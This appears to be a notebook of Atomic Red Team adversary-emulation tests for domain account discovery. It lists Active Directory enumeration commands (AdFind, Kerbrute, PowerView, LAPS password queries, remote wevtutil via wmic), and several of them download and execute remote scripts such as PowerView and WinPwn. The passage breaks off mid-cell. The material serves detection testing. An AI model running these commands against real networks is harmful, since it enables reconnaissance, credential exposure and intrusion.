{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "ee8f1785",
   "metadata": {},
   "source": "# T1087.002 - Domain Account\nAdversaries may attempt to get a listing of domain accounts. This information can help adversaries determine which domain accounts exist to aid in follow-on behavior such as targeting specific accounts which possess particular privileges.\n\nCommands such as <code>net user /domain</code> and <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039) utility, <code>dscacheutil -q group</code>on macOS, and <code>ldapsearch</code> on Linux can list domain users and groups. [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets including <code>Get-ADUser</code> and <code>Get-ADGroupMember</code> may enumerate members of Active Directory groups.  "
  },
  {
   "cell_type": "markdown",
   "id": "14e2500f",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "eef27351",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Enumerate all accounts (Domain)",
    "Enumerate all accounts\nUpon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet user /domain\nnet group /domain\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3fb2f507",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "30503acf",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Enumerate all accounts via PowerShell (Domain)",
    "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nnet user /domain\nget-localgroupmember -group Users\nget-aduser -filter *\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5a20e9b4",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "b3297573",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Enumerate logged on users via CMD (Domain)",
    "Enumerate logged on users. Upon exeuction, logged on users will be displayed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nquery user /SERVER:%COMPUTERNAME%\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4ba2b1e8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "8782661c",
   "metadata": {},
   "source": "### Atomic Test #4 - Automated AD Recon (ADRecon)\nADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its\npath will be displayed.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: ADRecon must exist on disk at specified location (#{adrecon_path})\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\ADRecon.ps1\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest -Uri \"https://raw.githubusercontent.com/sense-of-security/ADRecon/38e4abae3e26d0fa87281c1d0c65cabd4d3c6ebd/ADRecon.ps1\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\ADRecon.ps1\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "92a5d3b7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "09f8fd37",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nInvoke-Expression \"PathToAtomicsFolder\\..\\ExternalPayloads\\ADRecon.ps1\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "11592c45",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "6eeab4f9",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nGet-ChildItem \"PathToAtomicsFolder\\..\\ExternalPayloads\" -Recurse -Force | Where{$_.Name -Match \"^ADRecon-Report-\"} | Remove-Item -Force -Recurse\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "15003319",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 4 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "37b57e47",
   "metadata": {},
   "source": "### Atomic Test #5 - Adfind -Listing password policy\nAdfind tool can be used for reconnaissance in an Active directory environment. The example chosen illustrates adfind used to query the local password policy.\nreference- http://www.joeware.net/freetools/tools/adfind/, https://social.technet.microsoft.com/wiki/contents/articles/7535.adfind-command-examples.aspx\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d9202de5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "3e7453fa",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f7a77b59",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "0ca8eb0c",
   "metadata": {},
   "source": "### Atomic Test #6 - Adfind - Enumerate Active Directory Admins\nAdfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Admin accounts\nreference- http://www.joeware.net/freetools/tools/adfind/, https://stealthbits.com/blog/fun-with-active-directorys-admincount-attribute/\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "aec052a9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "c4fe90a5",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc admincountdmp\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b93d3df7",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "8eba5a4f",
   "metadata": {},
   "source": "### Atomic Test #7 - Adfind - Enumerate Active Directory User Objects\nAdfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory User Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c6dcf5f3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "00747da1",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -f (objectcategory=person)\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "433f1b0a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "34c9c17c",
   "metadata": {},
   "source": "### Atomic Test #8 - Adfind - Enumerate Active Directory Exchange AD Objects\nAdfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Exchange Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: AdFind.exe must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe)\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest -Uri \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1087.002/bin/AdFind.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f66e4a4c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 8 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "617be9e9",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\n\"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -sc exchaddresses\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "48e51a00",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "e7560ada",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Enumerate Default Domain Admin Details (Domain)",
    "This test will enumerate the details of the built-in domain admin account\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nnet user administrator /domain\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e59287f8",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "5e06a7a0",
   "metadata": {},
   "source": "### Atomic Test #10 - Enumerate Active Directory for Unconstrained Delegation\nAttackers may attempt to query for computer objects with the UserAccountControl property\n'TRUSTED_FOR_DELEGATION' (0x80000;524288) set\nMore Information - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html#when-the-stars-align-unconstrained-delegation-leads-to-rce\nPrerequisite: AD RSAT PowerShell module is needed and it must run under a domain user\n\n**Supported Platforms:** windows\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `powershell`!\n##### Description: PowerShell ActiveDirectory Module must be installed\n\n##### Check Prereq Commands:\n```powershell\nTry {\n    Import-Module ActiveDirectory -ErrorAction Stop | Out-Null\n    exit 0\n}\nCatch {\n    exit 1\n}\n\n```\n##### Get Prereq Commands:\n```powershell\nif((Get-CimInstance -ClassName Win32_OperatingSystem).ProductType -eq 1) {\n  Add-WindowsCapability -Name (Get-WindowsCapability -Name RSAT.ActiveDirectory.DS* -Online).Name -Online\n} else {\n  Install-WindowsFeature RSAT-AD-PowerShell\n}\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1cdd6802",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 10 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "552ca88a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-ADObject -LDAPFilter '(UserAccountControl:1.2.840.113556.1.4.803:=524288)' -Server $env:UserDnsDomain\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "951ac7e9",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "0d053eb3",
   "metadata": {},
   "source": [
    "### Atomic Test #11 - Get-DomainUser with PowerView",
    "Utilizing PowerView, run Get-DomainUser to identify the domain users. Upon execution, Users within the domain will be listed.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainUser -verbose\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "680a11a0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "eda0830f",
   "metadata": {},
   "source": [
    "### Atomic Test #12 - Enumerate Active Directory Users with ADSISearcher",
    "The following Atomic test will utilize ADSISearcher to enumerate users within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n([adsisearcher]\"objectcategory=user\").FindAll(); ([adsisearcher]\"objectcategory=user\").FindOne()\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b3b4d9fd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "294dfdf2",
   "metadata": {},
   "source": [
    "### Atomic Test #13 - Enumerate Linked Policies In ADSISearcher Discovery",
    "The following Atomic test will utilize ADSISearcher to enumerate organizational unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n(([adsisearcher]'(objectcategory=organizationalunit)').FindAll()).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] OU Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "acd5e022",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "caca8576",
   "metadata": {},
   "source": [
    "### Atomic Test #14 - Enumerate Root Domain linked policies Discovery",
    "The following Atomic test will utilize ADSISearcher to enumerate root domain unit within Active Directory.\nUpon successful execution a listing of users will output with their paths in AD.\nReference: https://medium.com/@pentesttas/discover-hidden-gpo-s-on-active-directory-using-ps-adsi-a284b6814c81\n",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n(([adsisearcher]'').SearchRooT).Path | %{if(([ADSI]\"$_\").gPlink){Write-Host \"[+] Domain Path:\"([ADSI]\"$_\").Path;$a=((([ADSI]\"$_\").gplink) -replace \"[[;]\" -split \"]\");for($i=0;$i -lt $a.length;$i++){if($a[$i]){Write-Host \"Policy Path[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).Path;Write-Host \"Policy Name[$i]:\"([ADSI]($a[$i]).Substring(0,$a[$i].length-1)).DisplayName} };Write-Output \"`n\" }}\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8f81f465",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 14"
  },
  {
   "cell_type": "markdown",
   "id": "d7fd59be",
   "metadata": {},
   "source": [
    "### Atomic Test #15 - WinPwn - generaldomaininfo",
    "Gathers general domain information using the generaldomaininfo function of WinPwn",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'\niex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ngeneraldomaininfo -noninteractive -consoleoutput```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6eaef480",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 15"
  },
  {
   "cell_type": "markdown",
   "id": "1e39ce90",
   "metadata": {},
   "source": "### Atomic Test #16 - Kerbrute - userenum\nEnumerates active directory usernames using the userenum function of Kerbrute\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: kerbrute.exe must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n\n##### Check Prereq Commands:\n```powershell\nif (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/ropnop/kerbrute/releases/download/v1.0.3/kerbrute_windows_386.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\kerbrute.exe\"\n\n```\n##### Description: username text file must exist in PathToAtomicsFolder\\..\\ExternalPayloads.\n\n##### Check Prereq Commands:\n```powershell\nif (test-path \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"){exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/src/username.txt?raw=true\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "005eab41",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 16 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "14826e47",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\ncd \"PathToAtomicsFolder\\..\\ExternalPayloads\"\n.\\kerbrute.exe userenum -d $env:USERDOMAIN --dc $env:UserDnsDomain \"PathToAtomicsFolder\\..\\ExternalPayloads\\username.txt\"```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4017789c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 16"
  },
  {
   "cell_type": "markdown",
   "id": "7ebc98d9",
   "metadata": {},
   "source": [
    "### Atomic Test #17 - Wevtutil - Discover NTLM Users Remote",
    "This test discovers users who have authenticated against a Domain Controller via NTLM. \nThis is done remotely via wmic and captures the event code 4776 from the domain controller and stores the ouput in C:\\temp. [Reference](https://www.reliaquest.com/blog/socgholish-fakeupdates/)\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n$target = $env:LOGONSERVER\n$target = $target.Trim(\"\\\\\")\n$IpAddress = [System.Net.Dns]::GetHostAddresses($target) | select IPAddressToString -ExpandProperty IPAddressToString\nwmic.exe /node:$IpAddress process call create 'wevtutil epl Security C:\\\\ntlmusers.evtx /q:\\\"Event[System[(EventID=4776)]]\"'```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "91337d3b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 17"
  },
  {
   "cell_type": "markdown",
   "id": "28eba718",
   "metadata": {},
   "source": "#### Cleanup: \n```powershell\nRemove-Item -Path \\\\$IpAddress\\c$\\ntlmusers.evtx\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5fb3ea11",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 17 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "9fb1864e",
   "metadata": {},
   "source": [
    "### Atomic Test #18 - Suspicious LAPS Attributes Query with Get-ADComputer all properties",
    "This test executes LDAP query using powershell command Get-ADComputer and lists all the properties including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-ADComputer $env:computername -Properties *```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "386b4816",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 18"
  },
  {
   "cell_type": "markdown",
   "id": "ed3a1f98",
   "metadata": {},
   "source": [
    "### Atomic Test #19 - Suspicious LAPS Attributes Query with Get-ADComputer ms-Mcs-AdmPwd property",
    "This test executes LDAP query using powershell command Get-ADComputer and lists Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-ADComputer $env:computername -Properties ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "39825148",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 19"
  },
  {
   "cell_type": "markdown",
   "id": "4c84d8f1",
   "metadata": {},
   "source": [
    "### Atomic Test #20 - Suspicious LAPS Attributes Query with Get-ADComputer all properties and SearchScope",
    "This test executes LDAP query using powershell command Get-ADComputer with SearchScope as subtree and lists all the properties including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nGet-adcomputer -SearchScope subtree -filter \"name -like '*'\" -Properties *```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3db94a30",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 20"
  },
  {
   "cell_type": "markdown",
   "id": "75fe579e",
   "metadata": {},
   "source": [
    "### Atomic Test #21 - Suspicious LAPS Attributes Query with adfind all properties",
    "This test executes LDAP query using adfind command and lists all the attributes including Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -h $env:USERDOMAIN -s subtree -f \"objectclass=computer\" *\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "167c7031",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 21"
  },
  {
   "cell_type": "markdown",
   "id": "644833a4",
   "metadata": {},
   "source": [
    "### Atomic Test #22 - Suspicious LAPS Attributes Query with adfind ms-Mcs-AdmPwd",
    "This test executes LDAP query using adfind command and lists Microsoft LAPS attributes ms-mcs-AdmPwd and ms-mcs-AdmPwdExpirationTime",
    "**Supported Platforms:** windows",
    "\nElevation Required (e.g. root or admin)",
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\n& \"PathToAtomicsFolder\\..\\ExternalPayloads\\AdFind.exe\" -h $env:USERDOMAIN -s subtree -f \"objectclass=computer\" ms-Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e67d57aa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 22"
  },
  {
   "cell_type": "markdown",
   "id": "215984b0",
   "metadata": {},
   "source": "### Atomic Test #23 - Active Directory Domain Search\nOutput information from LDAPSearch. LDAP Password is the admin-user password on Active Directory\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Packages sssd-ad sssd-tools realmd adcli installed and realm available, ldapsearch\n\n##### Check Prereq Commands:\n```sh\nwhich ldapsearch\n\n```\n##### Get Prereq Commands:\n```sh\necho ldapsearch not found\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "ab05cedb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 23 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "c9a7bcd6",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nldapsearch -H ldap://example.test:389 -x -D user@example.test -w s3CurePssw0rD! -b \"CN=Users,DC=example,DC=test\" -s sub -a always -z 1000 dn\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "031ed9cd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 23"
  },
  {
   "cell_type": "markdown",
   "id": "14eda396",
   "metadata": {},
   "source": "### Atomic Test #24 - Account Enumeration with LDAPDomainDump\nThis test uses LDAPDomainDump to perform account enumeration on a domain.\n[Reference](https://securityonline.info/ldapdomaindump-active-directory-information-dumper-via-ldap/)\n\n**Supported Platforms:** linux\n\nElevation Required (e.g. root or admin)\n#### Dependencies:  Run with `sh`!\n##### Description: Python3 must be installed\n##### Check Prereq Commands:\n```sh\nif [ -x \"$(command -v python3 --version)\" ]; then exit 0; else exit 1; fi;\n```\n##### Get Prereq Commands:\n```sh\nsudo apt-get -y install python3\n```\n##### Description: Pip must be installed\n##### Check Prereq Commands:\n```sh\nif [ -x \"$(command -v pip --version)\" ]; then exit 0; else exit 1; fi;\n```\n##### Get Prereq Commands:\n```sh\nwget -O /tmp/get-pip.py https://bootstrap.pypa.io/pip/3.6/get-pip.py\npython3 /tmp/get-pip.py\n```\n##### Description: The ldapdomaindump module must be installed\n##### Check Prereq Commands:\n```sh\npython3 -c 'import ldapdomaindump' 2>/dev/null\n```\n##### Get Prereq Commands:\n```sh\npip install ldapdomaindump\n```\n##### Description: The future module must be installed\n##### Check Prereq Commands:\n```sh\npython3 -c 'import future' 2>/dev/null\n```\n##### Get Prereq Commands:\n```sh\npip install future\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "f573af2b",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1087.002 -TestNumbers 24 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "56204a17",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `sh`\n",
    "```sh\nldapdomaindump -u domain\\user -p password 127.0.0.1 -o /tmp/T1087```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8c7fcd93",
   "metadata": {},
   "outputs": [],
